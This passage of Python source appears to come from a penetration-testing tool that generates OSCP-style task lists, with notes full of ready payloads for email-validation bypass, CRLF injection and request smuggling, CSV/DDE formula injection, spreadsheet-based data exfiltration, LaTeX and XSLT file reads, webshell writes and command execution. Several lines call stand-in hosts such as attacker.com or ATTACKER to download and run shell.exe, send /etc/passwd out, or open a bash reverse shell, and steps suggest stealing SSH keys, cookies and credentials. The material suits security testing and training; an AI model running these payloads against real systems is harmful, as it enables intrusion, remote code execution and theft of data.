=?utf-8?q?collab=40psres.net=3e=00?=foo@example.com
(Encoded @ as =40, > as =3e, null as =00)

Punycode:
x@xn--svg/-9x6 → x@<svg/

GitHub bypass:
=?x?q?collab=40psres.net=3e=00?=foo@example.com
Sends verification to collab@psres.net

Zendesk bypass:
"=?x?q?collab=22=40psres.net=3e=00==3c22x?="@example.com

Gitlab bypass:
=?x?q?collab=40psres.net_?=foo@example.com

Use cases:
- Create account with arbitrary domain
- Receive verification emails elsewhere
- Bypass domain whitelists
- Account takeover via email validation bypass''',
                        'success_indicators': [
                            'Bypass successful',
                            'Email received at attacker address',
                            'Domain whitelist bypassed'
                        ],
                        'failure_indicators': [
                            'Strong validation',
                            'Encoding stripped',
                            'Email not sent'
                        ],
                        'alternatives': [
                            'Try different encodings: utf-8, utf-7, iso-8859-1',
                            'Use Burp Turbo Intruder with email bypass script',
                            'Test Hackvertor for email splitting'
                        ],
                        'next_steps': [
                            'Create privileged accounts',
                            'Bypass domain restrictions',
                            'Access restricted features'
                        ]
                    }
                },
                {
                    'id': f'email-sso-abuse-{port}',
                    'name': 'Third-Party SSO Email Abuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit SSO providers for XSS and account takeover',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''SSO email abuse:

XSS via SSO:
Some SSO providers (GitHub, Salesforce) allow XSS in email:
test+<script>alert(1)</script>@example.com

If target trusts SSO provider and does not sanitize email,
XSS triggers when email displayed.

Account takeover:
Salesforce allows account creation without email verification.
1. Create Salesforce account with victim@target.com (unverified)
2. Use that to login to target app via SSO
3. Target app trusts Salesforce
4. Gain access to victim's account

Mitigation checks:
- Verify if SSO provider validates emails
- Check if target app validates email verification status
- Test if email field is sanitized

Reply-To abuse:
Send email with:
From: company.com
Reply-To: attacker.com

If automatic reply sent, attacker receives it.
Useful for internal email interception.''',
                        'success_indicators': [
                            'XSS triggered via email field',
                            'Account takeover via unverified SSO',
                            'Reply-To abuse successful'
                        ],
                        'failure_indicators': [
                            'Email sanitized',
                            'Email verification enforced',
                            'SSO trust properly validated'
                        ],
                        'alternatives': [
                            'Test other SSO providers',
                            'Try direct account creation',
                            'Look for email-based features (password reset)'
                        ],
                        'next_steps': [
                            'Document SSO trust issues',
                            'Attempt privilege escalation',
                            'Test other accounts'
                        ]
                    }
                }
            ]
        }

    def _create_crlf_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """CRLF Injection testing tasks"""
        return {
            'id': f'crlf-injection-{port}',
            'name': 'CRLF Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'crlf-basic-{port}',
                    'name': 'Test Basic CRLF Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for CRLF injection in HTTP headers',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''CRLF = Carriage Return (\\r = %0D) + Line Feed (\\n = %0A)

Used in HTTP to separate headers from body.
Injecting CRLF can add headers or split response.

Basic CRLF payloads:
%0D%0ASet-Cookie:admin=true
%0d%0aContent-Length:0
%0a%0aHTTP/1.1%20200%20OK

Test locations:
- URL path: /page%0d%0aHeader:value
- Parameters: ?redirect=http://site%0d%0aHeader:value
- Headers: X-Custom: value%0d%0aInjected:true

Example vulnerable log:
IP - Time - Path
If path contains CRLF, can forge log entries:
/page%0d%0a127.0.0.1 - 08:15 - /admin

Filter bypass encodings:
%E5%98%8A = %0A (Unicode \\u560a)
%E5%98%8D = %0D (Unicode \\u560d)
%E5%98%BE = %3E (Unicode \\u563e = >)
%E5%98%BC = %3C (Unicode \\u563c = <)

Alternative line separators:
%E2%80%A8 (U+2028 LINE SEPARATOR)
%E2%80%A9 (U+2029 PARAGRAPH SEPARATOR)
%C2%85 (U+0085 NEXT LINE)''',
                        'success_indicators': [
                            'Injected header visible in response',
                            'Response split successfully',
                            'Log entries forged'
                        ],
                        'failure_indicators': [
                            'CRLF stripped/encoded',
                            'No header injection',
                            'WAF blocks attempts'
                        ],
                        'alternatives': [
                            'Try Unicode line separators',
                            'Test HTTP/2 (different encoding)',
                            'Look for other injection points'
                        ],
                        'next_steps': [
                            'Escalate to HTTP response splitting',
                            'Test for XSS via injected headers',
                            'Attempt cache poisoning'
                        ]
                    }
                },
                {
                    'id': f'crlf-response-split-{port}',
                    'name': 'HTTP Response Splitting → XSS',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Split HTTP response to inject malicious content',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''HTTP Response Splitting:

Application sets header from user input:
X-Custom-Header: UserInput

Inject CRLFCRLF to end headers and start body:
?input=value%0d%0a%0d%0a<script>alert(document.domain)</script>

Response becomes:
HTTP/1.1 200 OK
X-Custom-Header: value

<script>alert(document.domain)</script>

Browser interprets injected content as response body.

Advanced payloads:
# XSS:
%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E

# Open redirect:
/%0d%0aLocation:%20http://attacker.com

# In URL path:
/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>...

# Forge complete response:
%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>

CORS bypass:
Inject: %0d%0aAccess-Control-Allow-Origin: *
Bypass SOP restrictions.''',
                        'success_indicators': [
                            'XSS executed from injected content',
                            'Response successfully split',
                            'Malicious HTML rendered'
                        ],
                        'failure_indicators': [
                            'Headers not injectable',
                            'Browser doesn\'t interpret split',
                            'Modern protections block attack'
                        ],
                        'alternatives': [
                            'Try cache poisoning instead',
                            'Test for session fixation',
                            'Look for other XSS vectors'
                        ],
                        'next_steps': [
                            'Steal cookies/tokens via XSS',
                            'Perform phishing attacks',
                            'Chain with CSRF'
                        ]
                    }
                },
                {
                    'id': f'crlf-request-smuggling-{port}',
                    'name': 'CRLF → HTTP Request Smuggling',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use CRLF to inject second HTTP request',
                        'tags': ['OSCP:HIGH', 'ADVANCED'],
                        'notes': '''CRLF to Request Smuggling:

Inject headers to keep connection open:
GET /%20HTTP/1.1%0d%0aHost:%20target.com%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1

Then inject second request:
GET /%20HTTP/1.1%0d%0aHost:%20target%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20target%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1

Exploitation:
1. Malicious prefix injection (poison next user):
GET /%20...%0d%0aGET%20/redir%20HTTP/1.1%0d%0aHost:%20attacker.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1

2. Response queue poisoning:
GET /%20...%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1

Trailing junk forms complete second request.

3. Cache poisoning:
Poison cache with attacker-controlled response.

PHP SoapClient exploitation:
$client = new SoapClient(null, array(
    'uri' => $target,
    'location' => $target,
    'user_agent' => "IGN\\r\\n\\r\\n".join("\\r\\n", $crlf_headers)
));

Inject CRLF in user_agent to add headers/body.

Memcache injection:
If app passes HTTP input to memcache, inject memcache commands:
key%0d%0aset%20poisoned%200%200%205%0d%0avalue%0d%0a

Poison cache to redirect victims.''',
                        'success_indicators': [
                            'Second request injected',
                            'Cache poisoned',
                            'Request smuggling confirmed'
                        ],
                        'failure_indicators': [
                            'Connection closed after first request',
                            'Back-end validates request format',
                            'No request smuggling vectors'
                        ],
                        'alternatives': [
                            'Try other HTTP smuggling techniques (CL.TE, TE.CL)',
                            'Test for session fixation',
                            'Look for cache poisoning vectors'
                        ],
                        'next_steps': [
                            'Poison web cache for XSS',
                            'Bypass access controls via smuggling',
                            'Steal credentials from other users'
                        ]
                    }
                },
                {
                    'id': f'crlf-recent-cves-{port}',
                    'name': 'Test Recent CRLF CVEs (2023-2025)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check for recent CRLF vulnerabilities in components',
                        'tags': ['OSCP:MEDIUM', 'RESEARCH'],
                        'notes': '''Recent CRLF vulnerabilities:

CVE-2024-45302: RestSharp (≥110.0.0 <110.2.0)
AddHeader() didn't sanitize CRLF
client.AddHeader("X-Foo","bar%0d%0aHost:evil")
→ SSRF, request smuggling

CVE-2024-51501: Refit (≤ 7.2.101)
Header attributes copied verbatim
[Headers("X: a%0d%0aContent-Length:0%0d%0a%0d%0aGET /admin HTTP/1.1")]
→ Second request injection

GHSA-4h3j-f5x9-r6x3: Apache APISIX Dashboard (2023)
redirect parameter echoed in Location header
/login?redirect=%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
→ Open redirect + cache poisoning

Unicode bypass (2023 Praetorian):
%E2%80%A8 (U+2028 LINE SEPARATOR)
%E2%80%A9 (U+2029 PARAGRAPH SEPARATOR)
%C2%85 (U+0085 NEXT LINE)

Some Java/Python/Go frameworks convert these to \\n.
Combine with classic payloads:
/%0A%E2%80%A8Set-Cookie:%20admin=true

WAF bypass via duplicate Content-Encoding:
%0d%0aContent-Encoding:%20identity%0d%0aContent-Length:%2030%0d%0a

Browsers ignore body, render attacker HTML → stored XSS.

Detection:
- Identify RestSharp, Refit usage
- Test header injection points
- Try Unicode line separators
- Check for unsafe header manipulation''',
                        'success_indicators': [
                            'Known vulnerable component found',
                            'CVE successfully exploited',
                            'Unicode bypass works'
                        ],
                        'failure_indicators': [
                            'Components patched',
                            'No vulnerable versions',
                            'WAF blocks unicode tricks'
                        ],
                        'alternatives': [
                            'searchsploit for component exploits',
                            'Check GitHub security advisories',
                            'Test custom CRLF vectors'
                        ],
                        'next_steps': [
                            'Exploit identified CVE',
                            'Report vulnerable components',
                            'Chain with other vulnerabilities'
                        ]
                    }
                },
                {
                    'id': f'crlf-automated-{port}',
                    'name': 'Automated CRLF Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'echo "Manual: Use CRLFsuite, crlfuzz, or Burp Scanner for {base_url}"',
                        'description': 'Run automated CRLF injection scanners',
                        'tags': ['OSCP:LOW', 'AUTOMATED'],
                        'flag_explanations': {
                            'CRLFsuite': 'Fast active scanner written in Go',
                            'crlfuzz': 'Wordlist-based fuzzer with Unicode payloads',
                            'Burp Scanner': 'Commercial scanner with CRLF checks'
                        },
                        'notes': '''Automated tools:
CRLFsuite: https://github.com/Raghavd3v/CRLFsuite
crlfuzz: https://github.com/dwisiswant0/crlfuzz
crlfix: https://github.com/glebarez/crlfix (Go-specific)

Wordlists:
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/crlf.txt

Manual testing preferred for OSCP but tools useful for large scope.''',
                        'success_indicators': [
                            'Vulnerabilities detected by scanner',
                            'Multiple injection points found'
                        ],
                        'failure_indicators': [
                            'No vulnerabilities found',
                            'False positives only'
                        ],
                        'alternatives': [
                            'Manual testing with Burp Repeater',
                            'Custom Python script',
                            'Browser DevTools network analysis'
                        ],
                        'next_steps': [
                            'Manually verify automated findings',
                            'Exploit confirmed vulnerabilities',
                            'Chain with other attacks'
                        ]
                    }
                }
            ]
        }

    def _create_csv_formula_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """CSV/Formula Injection testing tasks"""
        return {
            'id': f'csv-formula-injection-{port}',
            'name': 'CSV/Formula Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'csv-formula-detect-{port}',
                    'name': 'Test for CSV Formula Injection',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if input is reflected in CSV exports',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''CSV Formula Injection (Excel formulas in exports):

If your input appears in CSV/Excel files, you can inject formulas
that execute when user opens the file.

Basic payloads:
=cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
@SUM(1+9)*cmd|' /C calc'!A0
DDE ("cmd";"/C calc";"!A0")A0
=cmd|'/C powershell IEX(wget attacker/shell.exe)'!A0

Test fields:
- Name fields
- Comment fields
- Description fields
- Any user input exported to CSV

Social engineering required:
Excel will warn user multiple times about external content.
Attacker must convince user to accept warnings.

Real-world example:
Student record system allows formula injection in student name.
Teacher exports data to CSV, opens in Excel.
Formula executes when clicked.''',
                        'success_indicators': [
                            'Formula appears in exported CSV',
                            'Excel prompts to enable content',
                            'Formula executes in test environment'
                        ],
                        'failure_indicators': [
                            'Formula stripped/encoded',
                            'CSV not exported',
                            'Input sanitized'
                        ],
                        'alternatives': [
                            'Try DDE payloads if formula blocked',
                            'Test hyperlink injection',
                            'Look for other export formats (PDF, XML)'
                        ],
                        'next_steps': [
                            'Test hyperlink exfiltration',
                            'Attempt DDE RCE',
                            'Chain with phishing for execution'
                        ]
                    }
                },
                {
                    'id': f'csv-hyperlink-exfil-{port}',
                    'name': 'CSV Hyperlink Data Exfiltration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exfiltrate data using hyperlinks in CSV',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''Hyperlink exfiltration:

Excel formulas can create hyperlinks that exfiltrate data.

Payload structure:
=HYPERLINK("http://attacker.com/?data="&A1&A2&A3,"Click here")

When user clicks hyperlink, data from cells sent to attacker.

Advanced payloads:
=HYPERLINK(CONCATENATE("http://attacker.com/?",A1:E1),"Click")

Example: Student record injection
Attacker submits student details with formula:
=HYPERLINK("http://evil.com/?data="&B2&B3,"Click for grades")

Teacher exports CSV, clicks link.
Student data (including other students' info) sent to attacker.

Why this works:
- Formulas execute when file opened
- Hyperlinks look legitimate
- Data sent when clicked (REQUIRES USER INTERACTION)

Mitigation is difficult:
- Excel can't distinguish malicious from legitimate formulas
- Users often click without reading warnings
- Data exfiltration is subtle''',
                        'success_indicators': [
                            'Hyperlink created in Excel',
                            'Data received at attacker server',
                            'Multiple cells exfiltrated'
                        ],
                        'failure_indicators': [
                            'Formula blocked',
                            'Hyperlink sanitized',
                            'User doesn\'t click'
                        ],
                        'alternatives': [
                            'Use DDE for automatic execution',
                            'Try IMPORTXML/WEBSERVICE functions',
                            'Look for other injection points'
                        ],
                        'next_steps': [
                            'Exfiltrate sensitive fields (passwords, SSNs)',
                            'Map entire dataset via multiple hyperlinks',
                            'Escalate to RCE via DDE'
                        ]
                    }
                },
                {
                    'id': f'csv-dde-rce-{port}',
                    'name': 'DDE Formula RCE',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute commands via Dynamic Data Exchange',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''DDE (Dynamic Data Exchange) RCE:

Older Excel versions support DDE for executing commands.

Requirements:
File → Options → Trust Center → External Content
Enable "Dynamic Data Exchange Server Launch"

RCE payloads:
=cmd|' /C calc'!xxx
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell Invoke-WebRequest "http://attacker.com/shell.exe" -OutFile "$env:Temp\\shell.exe"; Start-Process "$env:Temp\\shell.exe"'!A1

How it works:
1. User opens CSV with DDE formula
2. Excel prompts: "This document contains links that may refer to other files"
3. If user accepts: Command executes
4. Attacker gets shell

Modern Excel warnings:
- Multiple prompts required
- "Enable Dynamic Data Exchange" must be on
- Social engineering critical

Payload encoding:
=cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1

Download and execute:
=cmd|'/C powershell IEX(New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A1''',
                        'success_indicators': [
                            'Command executes on target',
                            'Calculator/notepad launches',
                            'Reverse shell established'
                        ],
                        'failure_indicators': [
                            'DDE disabled (default in modern Excel)',
                            'User declines prompts',
                            'Command blocked by AV'
                        ],
                        'alternatives': [
                            'Use hyperlinks for data exfil only',
                            'Try macro-enabled files (.xlsm)',
                            'Look for other RCE vectors'
                        ],
                        'next_steps': [
                            'Establish reverse shell',
                            'Download and execute payloads',
                            'Escalate privileges on target'
                        ]
                    }
                },
                {
                    'id': f'csv-libreoffice-lfi-{port}',
                    'name': 'LibreOffice Calc LFI/Exfiltration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read local files and exfiltrate via LibreOffice formulas',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''LibreOffice Calc file inclusion:

Read local files:
='file:///etc/passwd'#$passwd.A1

Exfiltrate via WEBSERVICE:
=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)))

Multi-line exfiltration:
=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))

DNS exfiltration:
=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker-domain>"))

Why this works:
- LibreOffice allows file:// URIs
- WEBSERVICE makes HTTP requests
- DNS queries leak data

Target files:
/etc/passwd
/etc/shadow (if readable)
~/.ssh/id_rsa
~/.bash_history
/proc/self/environ
/var/www/html/config.php

Setup listener:
python3 -m http.server 8080
nc -lvnp 53 (for DNS)

Data appears in HTTP logs or DNS queries.''',
                        'success_indicators': [
                            'File contents retrieved',
                            'Data received at attacker server',
                            'Multiple files exfiltrated'
                        ],
                        'failure_indicators': [
                            'file:// URIs blocked',
                            'WEBSERVICE disabled',
                            'Firewall blocks outbound'
                        ],
                        'alternatives': [
                            'Try Google Sheets functions',
                            'Use DDE if Excel environment',
                            'Look for other file read vectors'
                        ],
                        'next_steps': [
                            'Extract SSH keys',
                            'Read config files for credentials',
                            'Map filesystem structure'
                        ]
                    }
                },
                {
                    'id': f'csv-google-sheets-oob-{port}',
                    'name': 'Google Sheets OOB Exfiltration',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exfiltrate data via Google Sheets functions',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''Google Sheets functions for OOB:

CONCATENATE: Append strings
=CONCATENATE(A2:E2)

IMPORTXML: Import data from structured types
=IMPORTXML(CONCAT("http://attacker.com/?v=", CONCATENATE(A2:E2)), "//a/a10")

IMPORTFEED: Import RSS/ATOM feeds
=IMPORTFEED(CONCAT("http://attacker.com/?v=", CONCATENATE(A2:E2)))

IMPORTHTML: Import from HTML tables
=IMPORTHTML(CONCAT("http://attacker.com/?v=", CONCATENATE(A2:E2)),"table",1)

IMPORTRANGE: Import from other spreadsheets
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/SHEET_ID", "sheet1!A2:E2")

IMAGE: Insert image (triggers HTTP request)
=IMAGE("http://attacker.com/log.png")

How it works:
1. Inject formula in field exported to Google Sheets
2. Formula executes when opened in Google Sheets
3. HTTP request sent to attacker
4. Data appears in query string or logs

Setup:
python3 -m http.server 8080
tail -f access.log

Data exfiltration:
All cells from A2:E2 sent to attacker server.

No user interaction required (unlike Excel hyperlinks).''',
                        'success_indicators': [
                            'HTTP request received',
                            'Data visible in query string',
                            'Multiple cells exfiltrated'
                        ],
                        'failure_indicators': [
                            'Functions blocked',
                            'No network access',
                            'Formula sanitized'
                        ],
                        'alternatives': [
                            'Use LibreOffice functions',
                            'Try Excel hyperlinks',
                            'Look for other export formats'
                        ],
                        'next_steps': [
                            'Exfiltrate entire dataset',
                            'Map sensitive fields',
                            'Chain with authentication bypass'
                        ]
                    }
                }
            ]
        }

    def _create_latex_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """LaTeX Injection testing tasks"""
        return {
            'id': f'latex-injection-{port}',
            'name': 'LaTeX Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'latex-detect-{port}',
                    'name': 'Detect LaTeX Processing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify LaTeX-to-PDF conversion endpoints',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'notes': '''LaTeX injection in PDF converters:

Many web apps use pdflatex to convert LaTeX to PDF.
If user input not sanitized, can read files, run commands.

pdflatex security modes:
--no-shell-escape: Disables \\write18{command} (safest)
--shell-restricted: Limited commands only (safer)
--shell-escape: Enable \\write18{command} (DANGEROUS)

Test for LaTeX processing:
$\\LaTeX$
\\documentclass{article}\\begin{document}Test\\end{document}

If PDF generated with "LaTeX" or content, LaTeX processing confirmed.

Vulnerable features:
- Resume builders
- Invoice generators
- Document converters
- Template systems
- Report generators

Test input fields for LaTeX syntax.''',
                        'success_indicators': [
                            'PDF generated from LaTeX',
                            'LaTeX commands processed',
                            'Special characters rendered'
                        ],
                        'failure_indicators': [
                            'LaTeX not processed',
                            'Input sanitized',
                            'No PDF generation'
                        ],
                        'alternatives': [
                            'Look for other template engines (SSTI)',
                            'Test for XXE in XML endpoints',
                            'Try other injection types'
                        ],
                        'next_steps': [
                            'Test file read capabilities',
                            'Attempt command execution',
                            'Map LaTeX attack surface'
                        ]
                    }
                },
                {
                    'id': f'latex-read-file-{port}',
                    'name': 'LaTeX File Read',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read local files via LaTeX commands',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''LaTeX file read techniques:

Read full file:
\\input{/etc/passwd}
\\include{password}
\\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\\usepackage{verbatim}
\\verbatiminput{/etc/passwd}

Read single line:
\\newread\\file
\\openin\\file=/etc/issue
\\read\\file to\\line
\\text{\\line}
\\closein\\file

Read multiple lines:
\\newread\\file
\\openin\\file=/etc/passwd
\\loop\\unless\\ifeof\\file
    \\read\\file to\\fileline
    \\text{\\fileline}
\\repeat
\\closein\\file

Adjust injection context:
May need to wrap in \\[ ... \\] or $ ... $ depending on context.

Target files:
/etc/passwd
/etc/shadow
~/.ssh/id_rsa
/var/www/html/config.php
/proc/self/environ
/etc/apache2/sites-enabled/000-default.conf

Output appears in generated PDF.''',
                        'success_indicators': [
                            'File contents in PDF',
                            'Sensitive data revealed',
                            'Multiple files readable'
                        ],
                        'failure_indicators': [
                            'Commands blocked',
                            'File not found errors',
                            'Empty PDF'
                        ],
                        'alternatives': [
                            'Try XXE if LaTeX blocked',
                            'Use command execution for file read',
                            'Look for other file inclusion vectors'
                        ],
                        'next_steps': [
                            'Extract SSH keys',
                            'Read web app config files',
                            'Escalate to command execution'
                        ]
                    }
                },
                {
                    'id': f'latex-write-file-{port}',
                    'name': 'LaTeX File Write',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Write files via LaTeX commands',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''LaTeX file write (XSLT 2.0 or extensions):

XSLT 2.0:
\\newwrite\\outfile
\\openout\\outfile=cmd.tex
\\write\\outfile{Hello-world}
\\closeout\\outfile

Xalan-J extension:
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt">Write Local File</redirect:write>
<redirect:close file="local_file.txt"/>
</xsl:template>

Write webshell:
\\newwrite\\outfile
\\openout\\outfile=/var/www/html/shell.php
\\write\\outfile{<?php system($_GET['cmd']); ?>}
\\closeout\\outfile

Write SSH key:
\\newwrite\\outfile
\\openout\\outfile=/root/.ssh/authorized_keys
\\write\\outfile{ssh-rsa AAAA... attacker@kali}
\\closeout\\outfile

Requirements:
- Write permissions on target directory
- Web server writable paths: /var/www/html, /tmp
- Some LaTeX processors disable write by default

Alternative: Use \\write18 for indirect write via commands.''',
                        'success_indicators': [
                            'File created successfully',
                            'Webshell accessible',
                            'SSH key injected'
                        ],
                        'failure_indicators': [
                            'Write blocked',
                            'Permission denied',
                            'Feature disabled'
                        ],
                        'alternatives': [
                            'Use command execution to write files',
                            'Try file upload vulnerabilities',
                            'Look for writeable directories'
                        ],
                        'next_steps': [
                            'Access webshell',
                            'SSH into system',
                            'Establish persistence'
                        ]
                    }
                },
                {
                    'id': f'latex-rce-{port}',
                    'name': 'LaTeX Command Execution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Execute OS commands via LaTeX',
                        'tags': ['OSCP:HIGH', 'EXPLOIT'],
                        'notes': '''LaTeX command execution:

\\write18 (requires --shell-escape):
\\immediate\\write18{env > output}
\\input{output}

\\input pipe:
\\input{|"/bin/hostname"}
\\input{|"extractbb /etc/passwd > /tmp/b.tex"}

mpost RCE (often allowed):
\\documentclass{article}\\begin{document}
\\immediate\\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\\end{document}

Then read /tmp/pwn with \\input.

Other allowed commands:
bibtex8 --version > /tmp/b.tex
kpsewhich pdfetex.ini > /tmp/b.tex
kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex
kpsewhich --var-value=shell_escape_commands > /tmp/b.tex

Reverse shell:
\\immediate\\write18{bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'}

Avoid LaTeX errors:
\\immediate\\write18{env | base64 > test.tex}
\\input{test.tex}

Base64 avoids special chars that break LaTeX.

Check shell_escape mode:
\\input{|"kpsewhich --var-value=shell_escape"}

If "t" or "1", command execution enabled.''',
                        'success_indicators': [
                            'Command output in PDF',
                            'Reverse shell established',
                            'System enumerated'
                        ],
                        'failure_indicators': [
                            '--no-shell-escape mode',
                            'Commands blocked',
                            'Restricted shell only'
                        ],
                        'alternatives': [
                            'Use --shell-restricted commands (mpost, bibtex)',
                            'Read files if execution blocked',
                            'Try SSTI or other injection types'
                        ],
                        'next_steps': [
                            'Establish reverse shell',
                            'Download payloads',
                            'Escalate privileges'
                        ]
                    }
                },
                {
                    'id': f'latex-xss-{port}',
                    'name': 'LaTeX XSS (if PDF rendered in browser)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Inject JavaScript if LaTeX output rendered as HTML',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'notes': '''LaTeX to XSS:

If LaTeX converted to HTML/web format:

\\url{javascript:alert(1)}
\\href{javascript:alert(1)}{placeholder}

Some LaTeX to HTML converters don't sanitize JavaScript URIs.

Example:
\\documentclass{article}
\\begin{document}
\\url{javascript:alert(document.domain)}
\\end{document}

If converted to HTML:
<a href="javascript:alert(document.domain)">...</a>

XSS executes when link clicked.

Also works with:
\\href{javascript:void(eval(atob("BASE64_PAYLOAD")))}{Click}

Use for:
- Cookie theft
- CSRF attacks
- Phishing
- Session hijacking

Requires HTML output, not just PDF.''',
                        'success_indicators': [
                            'XSS payload in HTML output',
                            'JavaScript executes',
                            'Session stolen'
                        ],
                        'failure_indicators': [
                            'Output is PDF only (no HTML)',
                            'JavaScript sanitized',
                            'CSP blocks execution'
                        ],
                        'alternatives': [
                            'Try standard XSS vectors',
                            'Focus on LaTeX RCE instead',
                            'Look for other HTML output'
                        ],
                        'next_steps': [
                            'Steal admin cookies',
                            'Perform CSRF attacks',
                            'Chain with other vulnerabilities'
                        ]
                    }
                }
            ]
        }

    def _create_xslt_injection_tasks(self, target: str, port: int, base_url: str) -> Dict[str, Any]:
        """XSLT Injection testing tasks"""
        return {
            'id': f'xslt-injection-{port}',
            'name': 'XSLT Injection Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'xslt-detect-{port}',
                    'name': 'Detect XSLT Processing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Identify XSLT transformation endpoints',
                        'tags': ['OSCP:MEDIUM', 'MANUAL', 'ENUM'],
                        'notes': '''XSLT (Extensible Stylesheet Language Transformations):
Transforms XML documents into different formats.

Common frameworks:
- Libxslt (Gnome)
- Xalan (Apache)
- Saxon (Saxonica)

Versions: 1.0 (most common), 2.0, 3.0

Fingerprint XSLT:
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
 Version: <xsl:value-of select="system-property('xsl:version')" /><br />
 Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
 Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
</xsl:template>
</xsl:stylesheet>

Output reveals XSLT processor and version.

Vulnerable features:
- XML to HTML converters
- Report generators
- Data transformation services
- Template engines
- ESI (Edge Side Includes) injection

Requires XSL tags stored server-side.''',
                        'success_indicators': [
                            'XSLT version/vendor in response',
                            'XML transformation confirmed',
                            'XSL templates processed'
                        ],
                        'failure_indicators': [
                            'No XSLT processing',
                            'Input sanitized',
                            'Static XML only'
                        ],
                        'alternatives': [
                            'Try XXE injection',
                            'Test for SSTI',
                            'Look for other XML features'
                        ],
                        'next_steps': [
                            'Test file read capabilities',
                            'Attempt SSRF',
                            'Try command execution (PHP-specific)'
                        ]
                    }
                },
                {
                    'id': f'xslt-read-file-{port}',
                    'name': 'XSLT File Read',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Read local files via XSLT unparsed-text',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'notes': '''XSLT file read:

XSLT 2.0 (unparsed-text):
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>

XXE-style:
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>

Via document() function:
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>

